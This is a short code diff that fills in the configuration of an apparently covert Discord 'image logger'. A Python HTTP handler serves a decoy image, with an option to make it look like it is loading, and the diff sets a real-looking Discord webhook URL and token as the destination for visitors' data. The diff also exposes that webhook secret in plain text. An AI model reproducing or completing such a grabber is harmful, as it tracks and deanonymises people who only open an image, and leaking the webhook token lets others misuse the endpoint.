@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'WEBHOOK'
-bindata = requests.get('link to image here').content
+webhook = 'https://discord.com/api/webhooks/1045634600648577034/HsVcROh2seIljaWWICtbnJbNtrc80VUXZUpx4eV43jmwLQkgWczmz8WOkPE1ONj0Ffez'
+bindata = requests.get('https://media.discordapp.net/attachments/691620895386501191/704884804700864618/unknown.png?width=688&height=434').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
